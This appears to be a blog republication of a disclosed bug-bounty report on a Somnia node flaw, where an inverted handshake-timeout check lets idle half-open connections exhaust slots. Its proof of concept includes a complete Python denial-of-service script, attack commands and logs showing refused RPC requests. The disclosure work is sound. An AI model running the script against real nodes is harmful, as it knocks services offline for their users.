---
title: "Unbounded growth of half-open peer connections can exhaust slots and denying access to RPC/API/P2P services"
date: 2025-08-25 12:00:00 +0700
categories: [Audits, Somnia]
tags: [cpp, somnia, dos, handshake, connections, hackenproof]
description: >-
  Inverted handshake timeout check lets half-open peer connections linger forever and exhaust slots — a disclosed Low finding on Somnia (SOMNIAAC-66).
image: /assets/img/somnia.png
---

> You can also view the full bug on the HackenProof disclosed report: [https://hackenproof.com/reports/SOMNIAAC-66](https://hackenproof.com/reports/SOMNIAAC-66)
{: .prompt-info }

## Metadata

- **Report ID:** [SOMNIAAC-66](https://hackenproof.com/reports/SOMNIAAC-66)
- **Severity:** Low
- **Status:** Disclosed
- **Category:** Application-Level Denial-of-Service (DoS)
- **Created by:** uint256vieet
- **Created at:** August 25, 2025
- **Reward:** 854 $

## Summary

A logic error in the `event_loop.SetRepeatedTimer` handshake timeout check allows half-open, unauthenticated peer connections to persist indefinitely.

An attacker (or organic traffic) can accumulate these connections until the node's connection slots are saturated, preventing new legitimate peers from joining. That can isolate nodes, degrade liveness, and potentially jeopardize consensus participation.

## Vulnerability Details

The peer transport periodically scans pending handshakes to disconnect peers that exceed a configured `handshake_timeout`. This check runs via a repeated timer set with `event_loop.SetRepeatedTimer()`, iterating over `unverified_connections` (connections that have not yet completed authentication/handshake). Each entry is represented by a `ConnectionData` object, which exposes `GetStartTime()`.

**Intended flow (high level):**

1. Incoming connection -> added to `unverified_connections`.
2. Periodic timer computes elapsed time since `GetStartTime()`.
3. If elapsed exceeds `parameters.handshake_timeout`, the connection should be closed and removed, freeing a slot.

**Observed behavior (specifics):**

The elapsed calculation uses an inverted subtraction order, comparing a negative duration against `handshake_timeout`. As a result, the timeout condition never triggers, and these half-open connections are never reclaimed.

```cpp
// Periodic task (runs every 1s)
event_loop.SetRepeatedTimer(std::chrono::seconds(1), [&] {
  for (auto* connection_data : unverified_connections) {
    // Root cause: elapsed is computed with reversed operands
    RealClock::duration elapsed = connection_data->GetStartTime() - RealClock::now();
    if (elapsed > parameters.handshake_timeout) {
      // Intended: close and remove timed-out connections
    }
  }
});
```

### Resource accounting blind spot

Connection memory usage is approximated by `ConnectionData::GetApproximateBytesUsedByConnection()`, which sums `socket.GetNumBytesInWriteQueue()` and `pending_received_data.size()`:

```cpp
std::uint64_t PeerNetworkTransport::ConnectionData::GetApproximateBytesUsedByConnection() const {
  return socket.GetNumBytesInWriteQueue() + pending_received_data.size();
}
```

- For a half-open connection that sent only an initial handshake message (already drained from the write queue) and is not sending further data, both metrics can be near zero. This means the global byte-cap is ineffective at constraining the number of idle half-open connections.
- Consequently, the node's `max_connections` (or similar slot limit) becomes the binding constraint and can be exhausted without triggering memory-based backpressure.

### Why this is exploitable

An attacker can repeatedly initiate connections and remain silent after the initial exchange, never completing authentication. Since the timeout never fires, these connections linger.

Over time, connection slots fill up with unverified peers, blocking legitimate inbound peers (and potentially outbound peer maintenance if slots are globally shared or tangentially constrained).

## Impact Details

### Primary impact — P2P connectivity

- Nodes can be isolated by saturating connection slots with half-open connections.
- Liveness degradation: fewer honest peers to gossip blocks/transactions, delayed synchronization.
- Consensus degradation for participating nodes: missed rounds/heartbeats/proposals due to insufficient peer connectivity can cause view changes, stalled progress, or increased fork rates.

### Secondary impact — operational instability

- Difficulties in recovery: nodes may require restarts or manual intervention to shed stale connections.
- Wider network effects: partitioning risks and increased variance in block propagation times.

### Higher-impact (assumptions required)

If the node plays a critical consensus role (e.g., validator/committee), prolonged isolation can cause missed duties, potential penalties depending on protocol rules, or cascading liveness failures across a cluster.

Additionally, the isolated node **will not accept any requests from users**, effectively **denying access** to RPC/API services.

## References

- Code: `somnia/transport/peer_network.cc` (handshake timeout loop using `event_loop.SetRepeatedTimer()`, `unverified_connections`, `ConnectionData::GetStartTime()`).

## Proof of Concept

This simulates how an attacker can exploit the bug — and even without an active attacker, the issue can still slowly happen organically.

### Create `attack.py`

```python
#!/usr/bin/env python3
import argparse
import socket
import time
import threading
from contextlib import suppress

def open_idle_connection(host: str, port: int, timeout: float):
    print(f"[*] Opening idle connection to {host}:{port}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    # Optional: reduce kernel-level keepalive churn; we're only holding connections open
    with suppress(Exception):
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    s.connect((host, port))
    # Do not send any data; keep the connection established but idle.
    return s

def worker(host: str, port: int, timeout: float, rate_per_sec: float, total: int, sock_list: list, lock: threading.Lock):
    interval = 1.0 / rate_per_sec if rate_per_sec > 0 else 0
    created = 0
    while created < total:
        try:
            s = open_idle_connection(host, port, timeout)
            with lock:
                sock_list.append(s)
            created += 1
        except Exception as e:
            print(f"[!] Connection failed: {e}")
            # Brief backoff on failure
            time.sleep(0.05)
            continue
        if interval > 0:
            time.sleep(interval)

def main():
    parser = argparse.ArgumentParser(description="PoC: Hold unverified connections open to exhaust connection slots")
    parser.add_argument("--host", default="127.0.0.1", help="Target host")
    parser.add_argument("--port", type=int, required=True, help="Target port (P2P/HTTP/WebSocket listener)")
    parser.add_argument("--connections", type=int, default=1000, help="Total connections to hold open")
    parser.add_argument("--concurrency", type=int, default=10, help="Number of parallel workers")
    parser.add_argument("--rate", type=float, default=200.0, help="Per-worker connection open rate (per second)")
    parser.add_argument("--timeout", type=float, default=3.0, help="Per-connection connect timeout (seconds)")
    parser.add_argument("--hold-seconds", type=int, default=600, help="How long to hold connections open")
    args = parser.parse_args()

    per_worker = args.connections // args.concurrency
    remainder = args.connections % args.concurrency

    sockets = []
    lock = threading.Lock()
    threads = []

    for i in range(args.concurrency):
        n = per_worker + (1 if i < remainder else 0)
        if n == 0:
            continue
        t = threading.Thread(
            target=worker,
            args=(args.host, args.port, args.timeout, args.rate, n, sockets, lock),
            daemon=True,
        )
        threads.append(t)

    print(f"[*] Target: {args.host}:{args.port}")
    print(f"[*] Creating {args.connections} idle connections across {args.concurrency} workers "
          f"at ~{args.rate} conn/s/worker (total up to ~{args.rate*args.concurrency} conn/s)")

    for t in threads:
        t.start()
    for t in threads:
        t.join()

    print(f"[+] Established {len(sockets)} connections. Holding for {args.hold_seconds}s...")
    try:
        # Keep sockets referenced and open
        time.sleep(args.hold_seconds)
    except KeyboardInterrupt:
        pass
    finally:
        print("[*] Closing sockets...")
        with lock:
            for s in sockets:
                with suppress(Exception):
                    s.close()
        print("[*] Done.")

if __name__ == "__main__":
    main()
```

### Start the local network

```shell
./ci/run-local-deployment.sh
```

### Change this limit to simulate quickly

```diff
diff --git a/somnia/api/api_parameters.h b/somnia/api/api_parameters.h
index 09827a0e..2b2baed9 100644
--- a/somnia/api/api_parameters.h
+++ b/somnia/api/api_parameters.h
@@ -95,7 +95,7 @@ struct APIParameters {
   // The parameters that limit the amount of API connections and socket memory we can use.
   ServerConnectionTrackerParameters api_connection_tracker_parameters =
-      ServerConnectionTrackerParameters::WithNameAndLimits("api", 32 * 1024,
+      ServerConnectionTrackerParameters::WithNameAndLimits("api", 5 * 1024,
                                                            1ull * 1024 * 1024 * 1024);
```

### Apply those logs for easy monitoring

```cpp
void PeerNetworkTransport::ConnectionData::SendData(std::vector<std::uint8_t> data) {
  RELEASE_ASSERT(IsConnected());
  std::uint64_t bytes_used_by_socket =
      socket.connection_data->GetApproximateBytesUsedByConnection();
  printf("---------------------------------Data already used by socket: %" PRIu64 "\n",
         bytes_used_by_socket);
  // If when sending more data to the peer it reaches it's limit we
  // avoid sending this last set of data
  if (!socket.connection_data->tracked_connection->TrySetNumBytesUsedByConnection(
          bytes_used_by_socket + data.size())) {
    return;
  }
  // We are connected, send the data.
  socket.Write(std::move(data));
}
```

```cpp
// Returns a proxy for interacting with the tracked connection. Caller must dispose of this proxy
// by passing it to `ConnectionClosed`.
std::shared_ptr<Connection> TryAddConnection(const std::string& client_address,
                                             std::function<void()> kill_connection) {
  spdlog::info(
      "---------------------------------TryAddConnection: num_open_connections: {} , "
      "max_connections: {} and tracker name: {}",
      num_open_connections, parameters.max_connections, parameters.tracker_name);
  if (num_open_connections + 1 > parameters.max_connections) {
    // We have too many connections.
    spdlog::warn(
        "ServerConnectionTracker is rejecting connection due to too many open connections ({})",
        num_open_connections);
    server_connection_tracker_num_rejected_connections.Increment();
    return nullptr;
  }
```

### Start attack

```shell
python3 attack.py --host 127.0.0.1 --port 7501 --connections 6000 --concurrency 10 --rate 10 --hold-seconds 900
```

- Open total: **6000** connections
- With **10** concurrent workers, each worker opens **10** connections/second
- Hold all for **900** seconds

You can see the logs:

```text
[*] Opening idle connection to 127.0.0.1:6501
[*] Opening idle connection to 127.0.0.1:6501
[*] Opening idle connection to 127.0.0.1:6501
[*] Opening idle connection to 127.0.0.1:6501
[+] Established 6000 connections. Holding for 900s...
```

From node1:

```text
[2025-08-25 21:57:15.525] [api_server     ] [warning] ServerConnectionTracker is rejecting connection due to too many open connections (5120)
[2025-08-25 21:57:15.527] [api_server     ] [info] ---------------------------------TryAddConnection: num_open_connections: 5120 , max_connections: 5120 and tracker name: api
[2025-08-25 21:57:15.527] [api_server     ] [warning] ServerConnectionTracker is rejecting connection due to too many open connections (5120)
[2025-08-25 21:57:15.527] [api_server     ] [info] ---------------------------------TryAddConnection: num_open_connections: 5120 , max_connections: 5120 and tracker name: api
[2025-08-25 21:57:15.527] [api_server     ] [warning] ServerConnectionTracker is rejecting connection due to too many open connections (5120)
[2025-08-25 21:57:15.528] [api_server     ] [info] ---------------------------------TryAddConnection: num_open_connections: 5120 , max_connections: 5120 and tracker name: api
[2025-08-25 21:57:15.528] [api_server     ] [warning] ServerConnectionTracker is rejecting connection due to too many open connections (5120)
[2025-08-25 21:57:15.538] [api_server     ] [info] ---------------------------------TryAddConnection: num_open_connections: 5120 , max_connections: 5120 and tracker name: api
[2025-08-25 21:57:15.538] [api_server     ] [warning] ServerConnectionTracker is rejecting connection due to too many open connections (5120)
[2025-08-25 21:57:15.552] [api_server     ] [info] ---------------------------------TryAddConnection: num_open_connections: 5120 , max_connections: 5120 and tracker name: api
[2025-08-25 21:57:15.552] [api_server     ] [warning] ServerConnectionTracker is rejecting connection due to too many open connections (5120)
[2025-08-25 21:57:15.621] [api_server     ] [info] ---------------------------------TryAddConnection: num_open_connections: 5120 , max_connections: 5120 and tracker name: api
[2025-08-25 21:57:15.621] [api_server     ] [warning] ServerConnectionTracker is rejecting connection due to too many open connections (5120)
```

Any request to node1 cannot work anymore, even a simple `eth_blockNumber` query:

```shell
curl -s -X POST http://127.0.0.1:6501 \
  -H "Content-Type: application/json" \
  --data '{"jsonrpc":"2.0","method":"eth_blockNumber","params":[],"id":1}'
```

```text
[2025-08-25 21:57:42.162] [api_server     ] [info] ---------------------------------TryAddConnection: num_open_connections: 5120 , max_connections: 5120 and tracker name: api
[2025-08-25 21:57:42.162] [api_server     ] [warning] ServerConnectionTracker is rejecting connection due to too many open connections (5120)
```
